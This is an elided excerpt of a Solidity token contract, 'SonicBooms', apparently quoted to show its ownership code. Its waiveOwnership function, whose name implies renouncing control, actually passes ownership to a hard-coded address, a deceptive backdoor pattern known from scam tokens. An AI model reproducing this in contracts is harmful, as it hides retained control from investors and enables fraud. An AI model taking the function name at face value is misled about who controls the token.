...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xc769350cE7Ceb62128e560809ec2De0Ac61bF6b3));
        _owner = address(0xc769350cE7Ceb62128e560809ec2De0Ac61bF6b3);
    }
...
contract SonicBooms is Context, IERC20, Ownable {
    ...
    string private _name = "SonicBOOMS";
    string private _symbol = "SonicBOOMS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xEBaD783eD06d3bCA197b152ea92a5Dc2AeE08a05);
    address payable public teamWalletAddress = payable(0xEBaD783eD06d3bCA197b152ea92a5Dc2AeE08a05);
